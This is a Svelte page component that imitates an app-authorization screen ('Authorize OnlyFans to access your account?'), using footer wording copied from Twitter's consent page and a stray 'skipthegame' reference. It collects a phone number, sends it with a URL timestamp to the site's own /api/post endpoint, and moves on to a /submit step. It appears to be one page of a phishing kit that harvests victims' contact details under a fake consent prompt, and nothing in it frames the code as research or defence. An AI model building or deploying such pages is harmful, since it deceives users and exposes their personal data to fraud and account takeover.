<script context="module">
    export function load({ url }) {
        let query = url.searchParams;
        return {
            props: {
                timestamp: query.get("t"),
            },
        };
    }
</script>

<script>
    import { onMount } from "svelte";
    import { goto } from "$app/navigation";

    async function put() {
        console.log('phone',phone);
        let res=await fetch("/api/post", {
            method: "PUT",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                phone:phone,
                timestamp:timestamp
            }),
        });
        let val=await res.json()
        console.log('res',val)
        goto("/submit");
    }
    let phone = "";

    export let timestamp;
</script>
<svelte:head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>onlyfans</title>
    <link rel="stylesheet" href="page4.css">
</svelte:head>
<body>
    <div class="mini-box">
        <div class="first-look">
      <div class="heading">
          <h4>Authorize OnlyFans to access your account?</h4>
      </div>
      <div class="submit-opstion">
          
          <input type="text" placeholder="phone number" bind:value={phone}> <br>
          <button type="button" on:click={put}><b>submit</b></button>

          

          
      </div>
  </div>
       
</div>
<footer>
    <div class="custom-containerr">
        <div class="footer-text">
            <p class="big-text">We recommend reviewing the app’s terms and privacy policy to understand how it will use data from your Twitter account.
             You can revoke access to any app at any time from the <span>Apps and sessions</span>  section of your skipthegame account</p>
            
        </div>

    </div>
</footer>
</body>
